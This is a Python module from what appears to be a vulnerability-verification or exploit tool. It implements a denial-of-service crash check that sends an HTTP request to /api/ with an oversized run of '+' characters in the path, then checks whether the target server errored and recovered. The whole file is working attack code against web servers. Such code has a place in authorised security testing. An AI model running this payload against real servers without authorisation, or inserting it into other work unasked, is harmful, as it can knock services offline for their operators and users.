"""modes/dos.py — DoS crash verification mode."""
from __future__ import annotations
import socket
import time

from core.spray import wrap_if_ssl, server_alive


def mode_dos(host: str, port: int, overflow_size: int = 200,
             vhost: str = "l", use_ssl: bool = False) -> dict:
    """DoS verification (rheodev style)."""
    result = {"vulnerable": False, "crashed": False}
    result["alive_before"] = server_alive(host, port, vhost=vhost, use_ssl=use_ssl)
    if not result["alive_before"]:
        result["error"] = "target not reachable"
        return result

    num_chars = overflow_size // 2
    uri = b"+" * num_chars
    try:
        sock = socket.create_connection((host, port), timeout=5)
        with wrap_if_ssl(sock, host, use_ssl) as s:
            s.sendall(
                b"GET /api/" + uri +
                b" HTTP/1.1\r\nHost:" + vhost.encode() +
                b"\r\nConnection:close\r\n\r\n"
            )
            resp = s.recv(256)
            if b"502" in resp or b"500" in resp:
                result["crashed"] = True
    except OSError:
        result["crashed"] = True

    time.sleep(2)
    result["alive_after"] = server_alive(host, port, vhost=vhost, use_ssl=use_ssl)
    if result["crashed"] and result["alive_after"]:
        result["vulnerable"] = True

    return result
